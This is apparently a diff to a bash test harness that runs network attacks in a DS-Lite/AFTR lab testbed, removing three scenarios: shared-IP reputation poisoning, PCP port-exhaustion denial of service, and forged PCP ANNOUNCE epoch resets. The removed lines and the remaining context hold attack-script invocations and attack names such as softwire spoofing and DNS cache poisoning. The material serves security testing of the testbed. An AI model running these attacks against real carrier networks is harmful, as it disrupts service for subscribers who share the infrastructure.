@@ -69,7 +69,7 @@ note() { printf '  · %s\n' "$*"; }
 
 # ── shared state hygiene (mirror run.sh reset_aftr_state / capture reset) ───
 reset_state() {
-    pkill -9 -f 'nat_hold|nat_exhaustion|ICMPv6ND_NA|tunnel_spoof|reputation_poisoning|pcp_attack|fragment_attack|dhcpv6_hijack|t4_softwire_inject|t9_peer_crosssub' 2>/dev/null
+    pkill -9 -f 'nat_hold|nat_exhaustion|ICMPv6ND_NA|tunnel_spoof|pcp_attack|fragment_attack|dhcpv6_hijack|t4_softwire_inject|t9_peer_crosssub' 2>/dev/null
     # Heal the softwire: re-add the ::b4N source (a DHCPv6 hijack/renewal can flush
     # it or the exit-hook can rebuild the tunnel from a DHCP-leased addr), then
     # force the tunnel local back to the stable ::b4N identity the AFTR expects.
@@ -229,18 +229,6 @@ restart_pcp() {
     sleep 1.2
 }
 
-# Restart the B4-1 PCP proxy from a clean client state, logging to a known file.
-# The proxy's relayed-mapping table (its RFC 6887 8.5 epoch state) otherwise
-# persists and grows across runs, so an ANNOUNCE renewal storm would reflect every
-# mapping seeded since boot rather than this run's seed. Resetting it makes the TS3
-# measurement deterministic. Mirrors the setup.sh launch (same log path).
-B41_PROXY_LOG=/var/log/pcp-proxy-b4-1.log
-reset_b4proxy() {
-    pkill -9 -f "pcp_proxy.py --lan-ip $GW1" 2>/dev/null; sleep 0.4
-    : > "$B41_PROXY_LOG" 2>/dev/null || true
-    nse b4-1 sh -c "python3 /testbed/b4/pcp_proxy.py --lan-ip $GW1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party >$B41_PROXY_LOG 2>&1 &"
-    sleep 2
-}
 
 # Resolve a knob value: knob_val <NAME> <default>. Reads KNOB_<NAME> env if set.
 knob_val() { local v="KNOB_$1"; echo "${!v:-$2}"; }
@@ -249,14 +237,11 @@ knob_val() { local v="KNOB_$1"; echo "${!v:-$2}"; }
 attack_name() {
     case "$1" in
         T1) echo "NAT Binding-Table Exhaustion";;
-        TS1) echo "Shared-IPv4 Reputation Poisoning";;
         T2) echo "Softwire Endpoint Spoofing & On-Path MITM";;
         T3) echo "Unencrypted-Tunnel Interception";;
         T4) echo "Downstream Softwire Injection";;
         T7) echo "Softwire Reassembly Poisoning";;
-        TS2) echo "PCP Port-Exhaustion DoS";;
         T8) echo "Unauthorized THIRD_PARTY Forwarding";;
-        TS3) echo "PCP ANNOUNCE Spoof (Epoch Reset)";;
         T9) echo "Cross-Subscriber PCP PEER + THIRD_PARTY";;
         T10) echo "B4 DNS Cache Poisoning";;
         T11) echo "Rogue AFTR Substitution";;
@@ -400,28 +385,6 @@ do_T2() {
     if [ "$mid_mac" = "$amac" ] && [ "$v1b" = 200 ] && [ "$v1" = 000 ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
 }
 
-# ─────────────────────────────────────────────────────────────────────────
-# TS1 - Shared-IPv4 Reputation Poisoning (collective punishment via shared IP)
-# ─────────────────────────────────────────────────────────────────────────
-spec_TS1() { echo "1-client-LAN|b4-1|eth-lan|;2-B4-softwire-uplink|b4-1|eth-isp|;3-AFTR-WAN-sharedIP|aftr|eth-wan|"; }
-knobs_TS1() { echo "count:150|300; target:$SRV"; }
-do_TS1() {
-    local outdir="$1" tgt cnt; tgt=$(knob_val TARGET "$SRV"); cnt=$(knob_val COUNT 150)
-    step "Surface: AFTR NAT/CGN. Every subscriber egresses under one shared IPv4 ($SHARED)."
-    start_caps "$(spec_TS1)" "$outdir" "TS1"
-    step "Attack: a malicious subscriber (client1 $C1) emits an abuse profile (spam/scan/flood)."
-    local cmd="python3 $T/dns/reputation_poisoning.py --mode abuse --target $tgt --count $cnt"
-    CMDS_RUN="client1: $cmd"
-    nse client1 sh -c "timeout 14 $cmd >/dev/null 2>&1"
-    stop_caps; cap_summary
-    step "Measure: on the AFTR WAN side, what source IP does the abuse carry?"
-    local wan abuse; wan="$outdir/TS1_3-AFTR-WAN-sharedIP.pcap"
-    abuse=$(pcap_count "$wan" "src $SHARED")
-    info "abuse packets egressing as the SHARED $SHARED = $abuse (blame lands on every co-subscriber)"
-    REF_LINE="all abuse egresses as the shared $SHARED (collective reputation damage)"
-    RUN_LINE="abuse packets sourced from $SHARED on the WAN = $abuse"
-    [ "$abuse" -gt 0 ] && VERDICT_PASS=1 || VERDICT_PASS=0
-}
 
 # ─────────────────────────────────────────────────────────────────────────
 # T3 - Unencrypted-Tunnel Interception (on-path reads subscriber plaintext)
@@ -526,32 +489,6 @@ client1 (victim fragmented flow): ping -s 3000 -c 30 $tgt"
     [ "${loss:-0}" -ge 50 ] && VERDICT_PASS=1 || VERDICT_PASS=0
 }
 
-# ─────────────────────────────────────────────────────────────────────────
-# TS2 - PCP Port-Exhaustion DoS (drain a B4's pool, freeze co-residents)
-# ─────────────────────────────────────────────────────────────────────────
-spec_TS2() { echo "1-pcp-uplink|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351"; }
-knobs_TS2() { echo "count:600|1200"; }
-do_TS2() {
-    local outdir="$1" cnt; cnt=$(knob_val COUNT 600)
-    step "Surface: AFTR PCP allocation table (per-subscriber port pool)."
-    restart_pcp 400   # clean, small pool so exhaustion is reachable + reproducible
-    start_caps "$(spec_TS2)" "$outdir" "TS2"
-    step "Attack: a B4-1 host floods MAP requests to drain B4-1's PCP pool."
-    local cmd="python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --proto 17 --count $cnt"
-    CMDS_RUN="client1: $cmd
-co-resident probe: pcp_attack.py map --proxy-ip $GW1 --proto 17"
-    local exout; exout=$(nse client1 sh -c "timeout 20 $cmd 2>&1")
-    info "$(echo "$exout" | grep -iE 'created|sent' | tail -1)"
-    step "Measure: a legit co-resident on B4-1 now asks for a mapping (same UDP pool)."
-    local mapout; mapout=$(nse client1 timeout 8 python3 "$T/infra/pcp_attack.py" map --proxy-ip "$GW1" --proto 17 --internal-port 9090 2>&1)
-    local frozen=0; echo "$mapout" | grep -qiE 'Mapping created' || frozen=1
-    info "$(echo "$mapout" | grep -iE 'created|failed|result|NO_RESOURCES' | tail -1)"
-    stop_caps; cap_summary
-    restart_pcp 1024   # restore the default pool
-    REF_LINE="pool drained; a co-resident's legit MAP is refused (NO_RESOURCES)"
-    RUN_LINE="co-resident MAP $([ "$frozen" = 1 ] && echo 'REFUSED (frozen)' || echo 'still succeeded')"
-    VERDICT_PASS=$frozen
-}
 
 # ─────────────────────────────────────────────────────────────────────────
 # T8 - Unauthorized THIRD_PARTY Forwarding (open inbound to another subscriber)
@@ -588,42 +525,6 @@ do_T8() {
 # which netns hosts a given subscriber inner IPv4 (10.0.1.100->client1, 10.0.2.100->client2)
 _ns_of() { case "$1" in 10.0.1.*) echo client1;; 10.0.2.*) echo client2;; *) echo client2;; esac; }
 
-# ─────────────────────────────────────────────────────────────────────────
-# TS3 - PCP ANNOUNCE Spoof / Epoch Reset (one packet -> mass renew storm)
-# ─────────────────────────────────────────────────────────────────────────
-spec_TS3() { echo "1-attacker-announce|attacker|eth-isp|udp port 5351 or udp port 5350;2-b4-renew-storm|b4-1|eth-isp|udp port 5351 or udp port 5350"; }
-knobs_TS3() { echo "count:10; seed:60"; }
-do_TS3() {
-    local outdir="$1" cnt seed; cnt=$(knob_val COUNT 10); seed=$(knob_val SEED 60)
-    urpf off; ensure_attacker_isp
-    restart_pcp 1024
-    reset_b4proxy               # clean the B4 client mapping table -> deterministic storm
-    step "Surface: PCP ANNOUNCE / restart signal. A reset makes clients believe the server rebooted."
-    step "Seed: create $seed legit mappings on the B4 so there is a mapping table to renew."
-    nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --count $seed >/dev/null 2>&1"
-    start_caps "$(spec_TS3)" "$outdir" "TS3"
-    step "Attack: attacker forges $cnt PCP ANNOUNCE (server-restart signal) from the AFTR address."
-    local cmd="python3 $T/infra/pcp_attack.py announce --interface eth-isp --aftr-ip6 $AFTR --count $cnt"
-    CMDS_RUN="attacker: $cmd"
-    nse attacker sh -c "timeout 12 $cmd >/dev/null 2>&1"
-    sleep 2                     # let the proxy finish emitting the renewals to its log
-    stop_caps; cap_summary
-    step "Measure: how many mappings did each ANNOUNCE force the B4 to re-create?"
-    # Deterministic ground truth from the B4 proxy's own epoch log (RFC 6887 8.5):
-    # each backward-epoch ANNOUNCE re-creates the WHOLE mapping table, so the renewal
-    # count is (# ANNOUNCE) x (mappings held) and does not depend on capture timing.
-    # (A raw packet capture undercounts/overcounts with proxy state and buffering,
-    # which is why the earlier tcpdump-window figure was not reproducible.)
-    local resets per renewals
-    resets=$(grep -c 'EPOCH RESET' "$B41_PROXY_LOG" 2>/dev/null); resets=${resets:-0}
-    per=$(grep -oE 're-creating [0-9]+ mapping' "$B41_PROXY_LOG" 2>/dev/null | grep -oE '[0-9]+' | sort -rn | head -1); per=${per:-0}
-    renewals=$(grep -oE 'renewal storm sent: [0-9]+' "$B41_PROXY_LOG" 2>/dev/null | grep -oE '[0-9]+' | awk '{s+=$1} END{print s+0}')
-    info "each ANNOUNCE re-created all $per mappings; $resets ANNOUNCE -> $renewals renewal MAP requests on the B4 uplink"
-    restart_pcp 1024
-    REF_LINE="each ANNOUNCE re-creates the B4's full mapping table; $cnt announces x $seed mappings = $((cnt*seed)) renewal MAP requests"
-    RUN_LINE="renewal MAP requests = $renewals ($per per ANNOUNCE x $resets ANNOUNCE)"
-    { [ "$resets" -eq "$cnt" ] && [ "$per" -ge 1 ] && [ "$renewals" -eq "$((resets*per))" ]; } && VERDICT_PASS=1 || VERDICT_PASS=0
-}
 
 # ─────────────────────────────────────────────────────────────────────────
 # T9 - Cross-Subscriber PCP PEER Enumeration (leak another sub's NAT ports)
